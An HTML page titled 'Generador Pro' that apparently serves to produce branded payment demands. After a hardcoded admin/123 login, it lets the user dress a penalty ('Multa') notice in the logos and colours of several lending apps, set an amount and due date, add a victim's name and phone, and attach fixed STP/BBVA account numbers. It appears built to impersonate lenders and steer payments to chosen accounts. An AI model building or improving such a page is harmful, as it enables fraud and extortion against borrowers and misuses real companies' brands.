<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Generador Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { font-family: 'Inter', sans-serif; background-color: #0b1120; margin: 0; }
        .input-monto { background: transparent; border: none; outline: none; width: 100%; color: white; font-weight: 700; font-size: 2.5rem; }
        
        /* Bloqueo inicial */
        #main-app { display: none; }
        #login-screen { 
            position: fixed; inset: 0; background: #0b1120; 
            display: flex; align-items: center; justify-content: center; z-index: 999; 
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

    <div id="login-screen">
        <div class="w-full max-w-sm bg-white p-10 rounded-[2.5rem] text-center shadow-2xl">
            <h2 class="text-2xl font-bold text-slate-800 mb-6">Iniciar Sesión</h2>
            <input type="text" id="user" placeholder="Usuario" class="w-full mb-4 px-5 py-3 rounded-2xl border border-slate-100 bg-slate-50 outline-none focus:border-blue-500 font-medium">
            <input type="password" id="pass" placeholder="Contraseña" class="w-full mb-6 px-5 py-3 rounded-2xl border border-slate-100 bg-slate-50 outline-none focus:border-blue-500 font-medium">
            <button onclick="acceder()" class="w-full bg-blue-600 text-white font-bold py-4 rounded-2xl shadow-lg active:scale-95 transition-all">INGRESAR</button>
        </div>
    </div>

    <div id="main-app" class="w-full max-w-[440px] bg-white rounded-[2.5rem] overflow-hidden shadow-2xl">
        <div id="header-bg" class="bg-[#0d9488] p-10 pb-16 text-center relative transition-all duration-500">
            <div class="w-24 h-24 bg-white rounded-[2rem] mx-auto mb-6 flex items-center justify-center overflow-hidden border-4 border-white/10">
                <img id="app-logo" src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
            </div>

            <select id="product-select" onchange="updateApp()" class="w-full bg-white border-none rounded-xl px-4 py-2.5 text-sm font-bold text-blue-600 text-center outline-none shadow-lg mb-4">
                <option value="tala|#0d9488|#065f46">Tala Préstamos</option>
                <option value="nu|#820ad1|#581c87">Préstamos NU</option>
                <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
                <option value="rapidos|#10b981|#047857">Préstamos Rápidos</option>
                <option value="worldmox|#0ea5e9|#0369a1">Worldmoxpro Cash GG</option>
                <option value="movil|#8b5cf6|#6d28d9">Movil Cash</option>
                <option value="talacredito|#0d9488|#065f46">Tala Crédito</option>
            </select>
            
            <div id="monto-card-bg" class="absolute -bottom-10 left-6 right-6 bg-[#065f46] rounded-[1.5rem] p-6 text-left text-white shadow-xl transition-all duration-500">
                <span class="text-[10px] font-bold opacity-70 uppercase tracking-widest">MONTO DE PAGO</span>
                <div class="flex items-center">
                    <span class="text-4xl font-bold mr-1">$</span>
                    <input type="number" id="input-monto" oninput="sync()" placeholder="0.00" class="input-monto">
                </div>
            </div>
        </div>

        <div class="h-16"></div>

        <div class="p-8 space-y-4">
            <div class="flex justify-between border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400">SUBPRODUCTO</span>
                <span class="text-sm font-bold text-slate-800">Multa</span>
            </div>
            <div class="flex justify-between border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400">IMPORTE</span>
                <span id="res-monto" class="text-sm font-bold text-slate-800">$0.00</span>
            </div>
            <div class="flex justify-between border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400">FECHA VENCIMIENTO</span>
                <input type="date" id="f-venc" onchange="dias()" class="text-sm font-bold outline-none cursor-pointer">
            </div>
            <div class="flex justify-between border-b border-slate-100 pb-2">
                <span class="text-[11px] font-bold text-slate-400">DÍAS VENCIMIENTO</span>
                <span id="res-dias" class="text-sm font-bold text-slate-800">0</span>
            </div>

            <div class="bg-slate-50 rounded-2xl p-4 border border-slate-100 text-center">
                <span class="text-[10px] font-bold text-slate-400 uppercase block mb-2">Método de pago</span>
                <select id="m-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2 font-bold text-center outline-none">
                    <option value="STP">STP</option>
                    <option value="BBVA">BBVA</option>
                </select>
            </div>

            <div class="bg-slate-50 rounded-2xl p-4 border border-slate-100 text-center">
                <span class="text-[10px] font-bold text-slate-400 uppercase block mb-2">Liga de pago</span>
                <select id="l-pago" class="w-full bg-white border border-slate-200 rounded-xl py-2 font-bold text-center text-blue-600 outline-none">
                    <option value="703010052250010635">703010052250010635</option>
                    <option value="1235132812492191">1235132812492191</option>
                </select>
            </div>

            <div class="space-y-3 pt-2">
                <input type="text" placeholder="Nombre" class="w-full text-sm border-b border-slate-200 pb-2 outline-none focus:border-blue-500">
                <input type="text" placeholder="Teléfono" class="w-full text-sm border-b border-slate-200 pb-2 outline-none focus:border-blue-500">
            </div>

            <button onclick="alert('✅ Liga Generada')" id="btn-main" class="w-full bg-[#065f46] text-white font-bold py-5 rounded-[1.5rem] shadow-xl uppercase text-xs tracking-widest mt-2 transition-all">
                Confirmar y Generar Link
            </button>
        </div>
    </div>

    <script>
        const logos = {
            'tala': 'https://i.ibb.co/qF6Vvqy/tala-te-presta.png',
            'nu': 'https://i.ibb.co/Lzf7vYn/image-45ecfc.png',
            'dida': 'https://i.ibb.co/BccC9Rz/image-46429b.png',
            'worldmox': 'https://i.ibb.co/VvzM47m/image-45e8a1.png',
            'movil': 'https://i.ibb.co/vY8N9zX/image-45e4a2.png',
            'rapidos': 'https://i.ibb.co/vY8N9zX/image-45ec84.png',
            'talacredito': 'https://i.ibb.co/qF6Vvqy/tala-te-presta.png'
        };

        function acceder() {
            if(document.getElementById('user').value === "admin" && document.getElementById('pass').value === "123") {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('main-app').style.display = 'block';
            } else { alert("Error de acceso"); }
        }

        function updateApp() {
            const [id, c1, c2] = document.getElementById('product-select').value.split('|');
            document.getElementById('header-bg').style.backgroundColor = c1;
            document.getElementById('monto-card-bg').style.backgroundColor = c2;
            document.getElementById('btn-main').style.backgroundColor = c2;
            document.getElementById('app-logo').src = logos[id] || logos['tala'];
        }

        function sync() {
            let v = document.getElementById('input-monto').value || "0";
            document.getElementById('res-monto').innerText = "$" + parseFloat(v).toLocaleString('en-US', {minimumFractionDigits: 2});
        }

        function dias() {
            let f = document.getElementById('f-venc').value;
            if(!f) return;
            let hoy = new Date(); hoy.setHours(0,0,0,0);
            let v = new Date(f + 'T00:00:00');
            let d = Math.ceil((v - hoy) / (1000 * 60 * 60 * 24));
            document.getElementById('res-dias').innerText = d;
            document.getElementById('res-dias').style.color = d < 0 ? "red" : "#1e293b";
        }

        document.getElementById('f-venc').value = new Date().toISOString().split('T')[0];
    </script>
</body>
</html>
